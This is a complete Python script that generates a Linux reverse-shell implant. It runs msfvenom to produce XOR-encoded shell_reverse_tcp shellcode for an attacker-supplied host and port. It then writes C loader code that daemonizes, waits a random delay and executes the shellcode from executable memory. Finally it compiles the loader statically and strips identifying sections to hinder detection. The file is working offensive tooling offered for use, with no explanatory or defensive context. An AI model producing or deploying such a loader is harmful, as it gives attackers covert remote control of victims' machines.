#!/usr/bin/env python3
import sys, subprocess, shutil, tempfile, os, textwrap

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
    sys.exit(1)

lhost, lport = sys.argv[1], sys.argv[2]
if shutil.which("msfvenom") is None: 
    print("msfvenom not found"); sys.exit(1)
if shutil.which("musl-gcc") is None: 
    print("musl-gcc not found"); sys.exit(1)

with tempfile.TemporaryDirectory() as td:
    raw_path = os.path.join(td, "sc.bin")
    cmd = [
        "msfvenom",
        "--platform","linux",
        "-p","linux/x64/shell_reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}",
        "-e","x64/xor_dynamic","-i","8","-b","\\x00",
        "-f","raw","-o", raw_path
    ]
    subprocess.check_call(cmd)
    sc = open(raw_path,"rb").read()
    hexstr = "".join([f"\\x{b:02x}" for b in sc])

c_code = textwrap.dedent(f"""
    #define _GNU_SOURCE
    #include <unistd.h>
    #include <signal.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/mman.h>
    #include <fcntl.h>
    #include <stdlib.h>
    #include <string.h>
    #include <time.h>
                         
    unsigned char buf[] = "{hexstr}";
    unsigned int buf_len = sizeof(buf) - 1;

    static void daemonize() {{
        pid_t pid = fork();
        if (pid < 0) _exit(1);
        if (pid > 0) _exit(0);
        if (setsid() < 0) _exit(1);
        signal(SIGHUP, SIG_IGN);
        pid = fork();
        if (pid < 0) _exit(1);
        if (pid > 0) _exit(0);
        umask(0);
        chdir("/");
        int fd = open("/dev/null", O_RDWR);
        if (fd >= 0) {{
            dup2(fd, 0);
            dup2(fd, 1);
            dup2(fd, 2);
            if (fd > 2) close(fd);
        }}
    }}

    int main() {{
        daemonize();
        struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
        unsigned r = (unsigned)(ts.tv_nsec ^ getpid());
        for (unsigned i=0;i<5+(r%6);i++) nanosleep(&(struct timespec){{0, 150000000}}, NULL);
        void *p = mmap(NULL, buf_len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0);
        if (p == MAP_FAILED) _exit(1);
        memcpy(p, buf, buf_len);
        ((void(*)())p)();
        return 0;
    }}
""").strip("\n")

open("exploit.c","w").write(c_code)

build = ["musl-gcc","-Os","-static","-fno-stack-protector","-no-pie","exploit.c","-o","loader.elf"]
subprocess.check_call(build)

if shutil.which("strip"):
    subprocess.call(["strip","-s","loader.elf"])
if shutil.which("objcopy"):
    subprocess.call(["objcopy","--remove-section=.comment","--remove-section=.note*","loader.elf","loader.elf"])

print("[+] Wrote exploit.c")
print("[+] Built loader.elf (musl static)")
